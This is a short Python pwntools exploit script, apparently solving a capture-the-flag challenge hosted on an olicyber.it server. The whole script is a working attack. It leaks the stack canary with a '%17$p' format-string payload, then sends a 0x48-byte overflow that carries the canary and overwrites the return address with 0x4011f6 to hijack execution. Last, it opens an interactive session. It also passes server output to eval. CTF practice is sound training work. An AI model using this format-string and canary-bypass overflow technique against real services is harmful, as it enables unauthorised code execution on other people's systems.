from pwn import *
r = remote("agecalculatorpro.challs.olicyber.it", 38103)
r.recv(2810)
r.sendline(b"%17$p")
canary = p64(eval(r.recvuntil(b",")[:-1].decode()))
r.sendline(b"A"*0x48+canary+p64(0)+p64(0x4011f6))
r.interactive()